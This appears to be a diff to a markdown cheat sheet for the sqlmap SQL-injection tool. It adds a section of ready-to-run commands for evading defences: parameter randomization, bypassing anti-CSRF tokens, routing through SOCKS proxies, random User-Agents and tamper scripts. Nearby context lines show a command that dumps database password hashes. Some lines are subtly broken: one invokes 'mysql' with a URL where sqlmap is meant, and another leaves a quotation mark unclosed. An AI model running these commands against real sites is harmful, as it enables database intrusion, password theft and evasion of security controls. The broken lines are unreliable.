@@ -121,3 +121,25 @@ mysql -u "http://www.example.com/?id=1" --search -T cred
 ```bash
 sqlmap -u "http://www.example.com/?id=1" --passwords --batch
 ```
+
+#### Bypassing security measures
+
+```bash
+# Using random values
+sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp
+
+# Bypassing anti-CSRF
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token
+
+# Using proxy
+sqlmap -u "http://www.example.com/" --proxy="socks4://203.0.113.50:3128"
+
+# Supplying a proxy list
+sqlmap -u "http://www.example.com/" --proxy-file=/opt/proxys/list.txt
+
+# Bypassing User-Agent filters
+sqlmap -u "http://www.example.com/" --random-agent
+
+# Tamper Scripts
+sqlmap -u "http://www.example.com/" --tamper=<script.py>
+```
